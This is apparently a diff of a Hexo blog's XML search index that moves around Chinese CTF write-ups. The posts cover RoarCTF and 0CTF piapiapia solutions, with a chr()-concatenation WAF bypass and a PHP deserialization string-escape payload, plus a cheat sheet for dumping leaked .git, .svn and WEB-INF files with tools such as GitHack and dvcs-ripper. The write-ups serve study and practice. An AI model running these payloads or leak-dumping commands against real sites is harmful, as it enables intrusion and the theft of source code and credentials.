+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WEB-INF&#x2F;web.xml泄露</span><br><span class="line">WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 </span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br></pre></td></tr></table></figure>
+
+<p>尝试WEB-INF/web.xml找到了疑似flag文件的东西…</p>
+<img src="/2020/02/19/RoarCTF/java1.png" class="" title="examplename">
+
+<p>可以看到有一个com.wm.ctf.FlagController</p>
+<p>构造payload:<code>WEB-INF/classes/com/wm.ctf.FlagController.class</code></p>
+<img src="/2020/02/19/RoarCTF/java2.png" class="" title="examplename">
+
+<p>可以看到一串base64编码的字符,解码即可得到flag.</p>
+<h4 id="2-Easy-Calc"><a href="#2-Easy-Calc" class="headerlink" title="2.Easy Calc"></a>2.Easy Calc</h4><p>是一道计算器的题，直接看网页源码找到了一个叫calc.php的文件，可以访问</p>
+<img src="/2020/02/19/RoarCTF/calc.png" class="" title="examplename">
+
+<p>可以看出payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’ 等字符,而且前面有提示说加上了WAF,这道题我们可以用%20来进行绕过WAF</p>
+
+
+<p>接下来的内容是刚刚从一篇博客学到的新知识，在这之前并不知道(我太菜了…)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php的文件操作函数：</span><br><span class="line">getcwd — 取得当前工作目录</span><br><span class="line">dirname(string $path) — 返回 path 的父目录</span><br><span class="line">scandir — 列出指定路径中的文件和目录</span><br></pre></td></tr></table></figure>
+
+<p>有了上面的这些操作函数,那么就看可以找flag了…</p>
+<p>一层层往上找</p>
+<img src="/2020/02/19/RoarCTF/java3.png" class="" title="examplename">
+
+<p>在这里找到了f1agg的文件,但是/是被过滤的,这里不能直接用<code>var_dump(file_get_contents(&#39;/f1agg&#39;));</code></p>
+<p>想到了用ascii码来进行绕过,用’.’来进行拼接</p>
+<p>payload：<code>var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))；</code></p>
+<p>顺利拿到flag</p>
+]]></content>
+      <tags>
+        <tag>something import</tag>
       </tags>
   </entry>
   <entry>
@@ -606,41 +606,21 @@
       </tags>
   </entry>
   <entry>
-    <title>buuojdiary</title>
-    <url>/2020/02/26/buuojdiary/</url>
-    <content><![CDATA[<p>[0CTF piapiapia]<a id="more"></a></p>
-<p>前几天i春秋的比赛里面有一道反序列化逃逸的题目，对于菜鸡而言真的是一脸懵逼，后来看了出题人的出题笔记，找到了这道题，废话不多说，进入正题。</p>
-<p>分析：扫描目录，可以从返回中找到<a href="http://www.zip，从而能够得到网站的逻辑和源码" target="_blank" rel="noopener">www.zip，从而能够得到网站的逻辑和源码</a></p>
-<p>(1)注册 (2)登录 (3)修改信息</p>
-<p>config.php中内容:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">	$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">	$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">	$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">	$flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+    <title>Hello World</title>
+    <url>/2020/01/02/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
 
-<p>大概知道了需要读取config.php来拿到flag</p>
-<p>接下来看一下profile.php文件</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">		$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">		$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
 
-<p>从代码来看,所要做的应该就是让$profile[‘photo’]=’profile.php’，这里有一个反序列化，那么应该就是要利用反序列化漏洞来读取profile.php，这样就能得到base64加密过的信息</p>
-<p>再来看update.php</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">		$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">		$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">		$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">		$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
 
-<p>可以看出phone、email、nackname、photo都是可以进行操作的</p>
-<p>在设置了profile的信息之后会调用这个函数进行处理：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">		$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">		$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
-<p>在filter方法中进行了过滤：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">		$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">		$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">		$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">		$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">		$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-
-<p>下面的东西，就是根据树哥的blog来做的，根据那篇文章这道题的点应该在nickname这里,可以看到filter中会用hacker来替代数组里的东西，也就有where的地方就会挤出字符</p>
-<p>第一个长度限制可以用数组进行绕过,也就是nickname[]</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>
-
-<p>下面来看一下正常序列化的结果:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">Array</span>(</span><br><span class="line"> <span class="string">'phone'</span> =&gt; <span class="string">'12345678911'</span>,</span><br><span class="line">    <span class="string">'email'</span> =&gt; <span class="string">'woc2@qq.com'</span>,</span><br><span class="line">    <span class="string">'nickname'</span> =&gt; [<span class="string">'hello'</span>],</span><br><span class="line">    <span class="string">'photo'</span> =&gt; <span class="string">'upload/'</span>.md5(<span class="string">'123.jpg'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//a:4&#123;s:5:"phone";s:11:"12345678911";s:5:"email";s:11:"woc2@qq.com";s:8:"nickname";a:1&#123;i:0;s:5:"hello";&#125;s:5:"photo";s:39:"upload/f47454d1d3644127f42070181a8b9afc";&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>现在要做的就是往nickname里塞入profile.php，直接给payload：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">4</span>&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"15000000000"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">11</span>:<span class="string">"woc2@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;a:<span class="number">1</span>&#123;i:<span class="number">0</span>;s:<span class="number">204</span>:<span class="string">"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;s:<span class="number">39</span>:<span class="string">"upload/f47454d1d3644127f42070181a8b9afc"</span>;&#125;</span><br><span class="line">这里<span class="number">34</span>个where加上<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;一共204个字符，在filter方法里34个where会被hacker替代，34个hacker就有204个字符此时，"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;不再是一大串where的一部分，s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>也不是简单的字符串了，在序列化时会被解析成profile[<span class="string">'photo'</span>]=<span class="string">'config.php'</span></span><br></pre></td></tr></table></figure>
-
-<p>下面就是注册登录更新信息，在profile.php中拿到base64码，解密拿到flag</p>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -754,24 +734,6 @@
       <tags>
         <tag>show</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2020/01/02/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-]]></content>
   </entry>
   <entry>
     <title>linux指令</title>
@@ -1075,6 +1037,44 @@
       </tags>
   </entry>
   <entry>
+    <title>buuojdiary</title>
+    <url>/2020/02/26/buuojdiary/</url>
+    <content><![CDATA[<p>[0CTF piapiapia]<a id="more"></a></p>
+<p>前几天i春秋的比赛里面有一道反序列化逃逸的题目，对于菜鸡而言真的是一脸懵逼，后来看了出题人的出题笔记，找到了这道题，废话不多说，进入正题。</p>
+<p>分析：扫描目录，可以从返回中找到<a href="http://www.zip，从而能够得到网站的逻辑和源码" target="_blank" rel="noopener">www.zip，从而能够得到网站的逻辑和源码</a></p>
+<p>(1)注册 (2)登录 (3)修改信息</p>
+<p>config.php中内容:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">	$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">	$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">	$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">	$flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>大概知道了需要读取config.php来拿到flag</p>
+<p>接下来看一下profile.php文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">		$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">		$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br></pre></td></tr></table></figure>
+
+<p>从代码来看,所要做的应该就是让$profile[‘photo’]=’profile.php’，这里有一个反序列化，那么应该就是要利用反序列化漏洞来读取profile.php，这样就能得到base64加密过的信息</p>
+<p>再来看update.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">		$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">		$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">		$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">		$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出phone、email、nackname、photo都是可以进行操作的</p>
+<p>在设置了profile的信息之后会调用这个函数进行处理：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">		$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">		$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在filter方法中进行了过滤：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">		$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">		$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">		$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">		$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">		$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面的东西，就是根据树哥的blog来做的，根据那篇文章这道题的点应该在nickname这里,可以看到filter中会用hacker来替代数组里的东西，也就有where的地方就会挤出字符</p>
+<p>第一个长度限制可以用数组进行绕过,也就是nickname[]</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>下面来看一下正常序列化的结果:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">Array</span>(</span><br><span class="line"> <span class="string">'phone'</span> =&gt; <span class="string">'12345678911'</span>,</span><br><span class="line">    <span class="string">'email'</span> =&gt; <span class="string">'woc2@qq.com'</span>,</span><br><span class="line">    <span class="string">'nickname'</span> =&gt; [<span class="string">'hello'</span>],</span><br><span class="line">    <span class="string">'photo'</span> =&gt; <span class="string">'upload/'</span>.md5(<span class="string">'123.jpg'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//a:4&#123;s:5:"phone";s:11:"12345678911";s:5:"email";s:11:"woc2@qq.com";s:8:"nickname";a:1&#123;i:0;s:5:"hello";&#125;s:5:"photo";s:39:"upload/f47454d1d3644127f42070181a8b9afc";&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>现在要做的就是往nickname里塞入profile.php，直接给payload：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">4</span>&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"15000000000"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">11</span>:<span class="string">"woc2@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;a:<span class="number">1</span>&#123;i:<span class="number">0</span>;s:<span class="number">204</span>:<span class="string">"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;s:<span class="number">39</span>:<span class="string">"upload/f47454d1d3644127f42070181a8b9afc"</span>;&#125;</span><br><span class="line">这里<span class="number">34</span>个where加上<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;一共204个字符，在filter方法里34个where会被hacker替代，34个hacker就有204个字符此时，"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;不再是一大串where的一部分，s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>也不是简单的字符串了，在序列化时会被解析成profile[<span class="string">'photo'</span>]=<span class="string">'config.php'</span></span><br></pre></td></tr></table></figure>
+
+<p>下面就是注册登录更新信息，在profile.php中拿到base64码，解密拿到flag</p>
+]]></content>
+  </entry>
+  <entry>
     <title>sqli</title>
     <url>/2020/01/13/sqli/</url>
     <content><![CDATA[<p>根据sqli-labs上的教学做了一个sql用法的总结</p>
@@ -1161,6 +1161,60 @@
 ]]></content>
       <tags>
         <tag>ssrf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息泄露</title>
+    <url>/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
+    <content><![CDATA[<h4 id="0x01：-hg源码泄漏"><a href="#0x01：-hg源码泄漏" class="headerlink" title="0x01：.hg源码泄漏 "></a><strong>0x01：.hg源码泄漏</strong> <a id="more"></a></h4><p>漏洞成因：hg init 的时候会生成.hg</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e.g.http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用:dvcs-ripper</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rip -hg.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02-git源码泄漏"><a href="#0x02-git源码泄漏" class="headerlink" title="0x02: .git源码泄漏"></a>0x02: .git源码泄漏</h4><p>漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p>
+<p>漏洞利用:GitHack</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GitHack.py http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x03-DS-Store文件泄漏"><a href="#0x03-DS-Store文件泄漏" class="headerlink" title="0x03:  .DS_Store文件泄漏"></a>0x03:  .DS_Store文件泄漏</h4><p>漏洞成因:在发布代码时未删除文件夹中隐藏的.DS_store,被发现后，获取敏感信息.</p>
+<p>漏洞利用:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store</span><br></pre></td></tr></table></figure>
+
+<p>工具:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dsstoreexp</span><br><span class="line">python ds_store_exp.py http:&#x2F;&#x2F;www.example.com&#x2F;.DS_Store</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x04-网站备份压缩文件"><a href="#0x04-网站备份压缩文件" class="headerlink" title="0x04:网站备份压缩文件"></a>0x04:网站备份压缩文件</h4><p>当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
+<p>漏洞成因：</p>
+<ul>
+<li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li>
+<li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li>
+</ul>
+<p>漏洞测试：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.swp</span><br><span class="line">.txt</span><br><span class="line">.html</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x05-SVN文件泄漏"><a href="#0x05-SVN文件泄漏" class="headerlink" title="0x05:SVN文件泄漏"></a>0x05:SVN文件泄漏</h4><p>漏洞利用：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dvcs-ripper</span><br><span class="line">rip-svn.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x06：WEB-INF-web-xml泄漏"><a href="#0x06：WEB-INF-web-xml泄漏" class="headerlink" title="0x06：WEB-INF/web.xml泄漏"></a>0x06：WEB-INF/web.xml泄漏</h4><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
+<p>WEB-INF主要文件或目录：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</span><br></pre></td></tr></table></figure>
+
+<p>0x07：CVS泄漏</p>
+<p>漏洞利用:</p>
+<p>取回源码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bk clone http:&#x2F;&#x2F;url&#x2F;name dir&#x2F;&#x2F;这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bk changes</span><br><span class="line">Bazaar&#x2F;bzr</span><br><span class="line">&#x2F;&#x2F;查看所有的改变的命令，转到download的目录</span><br></pre></td></tr></table></figure>
+
+<p>工具：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dvcs-ripper</span><br><span class="line">rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>敏感信息</tag>
       </tags>
   </entry>
   <entry>
@@ -1312,60 +1366,6 @@
 ]]></content>
       <tags>
         <tag>train</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>信息泄露</title>
-    <url>/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
-    <content><![CDATA[<h4 id="0x01：-hg源码泄漏"><a href="#0x01：-hg源码泄漏" class="headerlink" title="0x01：.hg源码泄漏 "></a><strong>0x01：.hg源码泄漏</strong> <a id="more"></a></h4><p>漏洞成因：hg init 的时候会生成.hg</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e.g.http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>漏洞利用:dvcs-ripper</p>
